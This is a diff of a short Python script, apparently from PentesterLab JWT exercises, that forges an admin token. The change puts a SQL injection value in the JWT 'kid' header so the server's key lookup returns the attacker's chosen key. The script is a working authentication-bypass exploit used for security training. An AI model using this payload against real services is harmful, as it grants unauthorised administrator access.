@@ -8,6 +8,8 @@ Refer other files in this directory for codes doing the exact same thing but
 without using the jwt lib (using Python hashlib which the lib itself uses)
 '''
 import jwt
-key = "pentesterlab" #your secret key
-encodedJwt = jwt.encode(headers={"alg":"HS256"},payload={"user":"admin"},key=key,algorithm="HS256")
+key = "1" #your secret key
+header = {"typ":"JWT","alg":"HS256","kid":"mitxkey' UNION SELECT '1"}
+payload = {"user":"admin"}
+encodedJwt = jwt.encode(headers=header,payload=payload,key=key,algorithm="HS256")
 print(encodedJwt)
